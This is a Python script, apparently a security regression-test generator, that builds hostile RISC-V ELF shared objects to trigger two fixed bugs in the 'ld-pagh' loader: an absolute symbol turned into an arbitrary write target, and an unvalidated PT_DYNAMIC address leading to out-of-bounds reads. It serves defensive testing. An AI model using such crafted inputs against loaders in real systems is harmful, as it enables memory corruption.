#!/usr/bin/env python3
"""Craft ET_DYN objects for the ld-pagh loader regression tests.

This is the PoC generator from the runtime audit
(`attack/runtime/tools/make_evil_elf.py`, owner kostya-runtime), copied into
the repository so the fixes for F-rt-1 and F-rt-3 stay regression-tested.  It
is only used by `tools/live-security.py`; the objects are written to a
throw-away ext2 image, never installed.

Two loader inputs are crafted:

* F-rt-1 — `__pagh_dl_state` as an `SHN_ABS` symbol.  `__pagh_dl_run()` used
  to resolve the name through every global object *including the ET_DYN being
  run* and then do `*slot = st`, so `st_value` became an arbitrary store
  destination.  With `--entry-stub` the object also gets a tiny entry point
  (`li a0, 0; ret`) so that, once the loader refuses to honour the symbol, the
  object still runs and exits cleanly — a clean exit proves the store did not
  happen (the store to 0x41414141... or to the loader's `dl_state` used to kill
  the loader).

* F-rt-3 — a `PT_DYNAMIC` with a file-chosen `p_vaddr`/`p_memsz` that is never
  compared with the mapped image; `dyn_value()`/`collect_needed()` used
  `base + p_vaddr` as an array.  The loader must now reject it as a malformed
  ELF instead of reading at that address.

Usage:
    python3 tests/security/make_evil_elf.py out.elf --target 0x4141414141414141
    python3 tests/security/make_evil_elf.py out.elf --target 0 --dyn-vaddr 0x4141414141414141
"""

import argparse
import struct
import sys

ET_DYN = 3
EM_RISCV = 243
SHT_STRTAB = 3
SHT_DYNSYM = 11
SHN_ABS = 0xFFF1
STB_GLOBAL = 1
STT_OBJECT = 1

# `li a0, 0; ret`: the entry point of a valid-but-hostile object.  Returning 0
# makes ld-pagh's own crt0 exit 0 when the loader accepts and runs the object.
ENTRY_STUB = struct.pack("<II", 0x00000513, 0x00008067)


def build(symbol, target, dyn_vaddr=None, dyn_memsz=16, entry_stub=False):
    """`dyn_vaddr` adds a PT_DYNAMIC program header whose p_vaddr/p_memsz are
    not validated against the mapped image by the buggy loader."""
    dynstr = b"\x00" + symbol.encode() + b"\x00"
    name_off = 1

    # .dynsym: null symbol + the one absolute symbol.
    dynsym = struct.pack("<IBBHQQ", 0, 0, 0, 0, 0, 0)
    dynsym += struct.pack(
        "<IBBHQQ",
        name_off,
        (STB_GLOBAL << 4) | STT_OBJECT,
        0,
        SHN_ABS,
        target,
        8,
    )

    phnum = 2 if dyn_vaddr is not None else 1
    ehsize = 64
    phentsize = 56
    shentsize = 64
    phoff = ehsize
    dynsym_off = phoff + phnum * phentsize
    dynstr_off = dynsym_off + len(dynsym)
    shoff = dynstr_off + len(dynstr)
    # The whole image is one PT_LOAD at vaddr 0, copied from file offset 0,
    # so a section's `addr` equals its file offset and it is inside the image
    # the loader maps (dynsym_view() reads the table from the image, the
    # string table from the file buffer).
    body = ehsize + phnum * phentsize + len(dynsym) + len(dynstr) + 2 * shentsize
    entry = 0
    blob_extra = b""
    if entry_stub:
        entry = (body + 3) & ~3
        blob_extra = b"\x00" * (entry - body) + ENTRY_STUB
    total = body + len(blob_extra)

    ehdr = b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
    ehdr += struct.pack(
        "<HHIQQQIHHHHHH",
        ET_DYN,          # e_type
        EM_RISCV,        # e_machine
        1,               # e_version
        entry,           # e_entry
        phoff,           # e_phoff
        shoff,           # e_shoff
        0,               # e_flags
        ehsize,          # e_ehsize
        phentsize,       # e_phentsize
        phnum,           # e_phnum
        shentsize,       # e_shentsize
        2,               # e_shnum
        0,               # e_shstrndx (the loader never reads it)
    )

    phdr = struct.pack(
        "<IIQQQQQQ",
        1,               # PT_LOAD
        7,               # PF_R | PF_W | PF_X
        0,               # p_offset
        0,               # p_vaddr
        0,               # p_paddr
        total,           # p_filesz
        total,           # p_memsz
        0x1000,          # p_align
    )

    if dyn_vaddr is not None:
        phdr = phdr + struct.pack(
            "<IIQQQQQQ",
            2,               # PT_DYNAMIC
            6,               # PF_R | PF_W
            0,               # p_offset (unused by the loader here)
            dyn_vaddr,       # p_vaddr: forwarded to o->base + p_vaddr
            0,               # p_paddr
            0,               # p_filesz
            dyn_memsz,       # p_memsz: the loop bound the loader used to trust
            0x1000,
        )

    # sh[0] = SHT_DYNSYM (link -> sh[1] = the string table)
    # sh[1] = SHT_STRTAB
    sh0 = struct.pack(
        "<IIQQQQIIQQ",
        0,               # sh_name
        SHT_DYNSYM,      # sh_type
        0,               # sh_flags
        dynsym_off,      # sh_addr: in the mapped image
        dynsym_off,      # sh_offset: in the file
        len(dynsym),     # sh_size
        1,               # sh_link: the string table section index
        0,               # sh_info
        8,               # sh_addralign
        24,              # sh_entsize
    )
    sh1 = struct.pack(
        "<IIQQQQIIQQ",
        0, SHT_STRTAB, 0, dynstr_off, dynstr_off, len(dynstr), 0, 0, 1, 0,
    )

    blob = bytearray(ehdr + phdr + dynsym + dynstr + sh0 + sh1 + blob_extra)
    assert len(blob) == total, (len(blob), total)
    return bytes(blob)


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("out")
    ap.add_argument("--target", required=True,
                    help="absolute 64-bit address the loader used to store to")
    ap.add_argument("--symbol", default="__pagh_dl_state")
    ap.add_argument("--dyn-vaddr", default=None,
                    help="add a PT_DYNAMIC with this unvalidated p_vaddr")
    ap.add_argument("--dyn-memsz", default=16, type=lambda s: int(s, 0),
                    help="p_memsz for the crafted PT_DYNAMIC (default 16)")
    ap.add_argument("--entry-stub", action="store_true",
                    help="set e_entry to a `li a0,0; ret` stub")
    args = ap.parse_args()
    target = int(args.target, 0) & 0xFFFFFFFFFFFFFFFF
    dyn_vaddr = None
    if args.dyn_vaddr is not None:
        dyn_vaddr = int(args.dyn_vaddr, 0) & 0xFFFFFFFFFFFFFFFF
    blob = build(args.symbol, target, dyn_vaddr, args.dyn_memsz, args.entry_stub)
    with open(args.out, "wb") as fh:
        fh.write(blob)
    sys.stdout.write(
        "wrote %s: %d bytes, symbol %r -> SHN_ABS 0x%x%s%s\n"
        % (args.out, len(blob), args.symbol, target,
           "" if dyn_vaddr is None else ", PT_DYNAMIC vaddr 0x%x memsz 0x%x" % (dyn_vaddr, args.dyn_memsz),
           ", entry stub" if args.entry_stub else "")
    )


if __name__ == "__main__":
    main()